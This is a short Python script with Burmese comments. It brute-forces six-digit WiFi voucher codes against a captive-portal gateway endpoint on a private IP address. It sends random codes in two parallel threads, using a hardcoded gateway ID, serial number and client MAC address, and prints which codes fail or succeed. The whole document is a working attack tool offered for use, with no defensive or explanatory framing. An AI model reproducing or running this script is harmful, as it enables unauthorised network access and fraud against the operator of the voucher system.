import requests
import random
import time
import threading

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def check_code():
    while True:
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            # timeout ကို လျှော့ချပြီး အမြန်နှုန်းတင်ထားသည်
            res = requests.get(url, params=params, timeout=3)
            
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}Fail Code: {code}{END}")
            elif res.status_code == 200:
                print(f"{GREEN}Success Code: {code}{END}")
                # အမှန်တွေ့ရင် အကုန်ရပ်ဖို့အတွက် သိမ်းထားနိုင်သည်
                break
        except:
            # Connection ပြတ်တောက်ရင် ခဏစောင့်ပြီး ပြန်စမ်းမယ်
            pass

def start_multi_thread():
    print(f"{CYAN}[+] Speed Booster: Active (2x Speed){END}")
    print(f"{CYAN}[+] Start Bruteforcing...{END}")
    
    # အမြန်နှုန်း ၂ ဆဖြစ်အောင် Thread ၂ ခု ပြိုင်တူ run မယ်
    threads = []
    for i in range(2): 
        t = threading.Thread(target=check_code)
        t.start()
        threads.append(t)

if __name__ == "__main__":
    start_multi_thread()
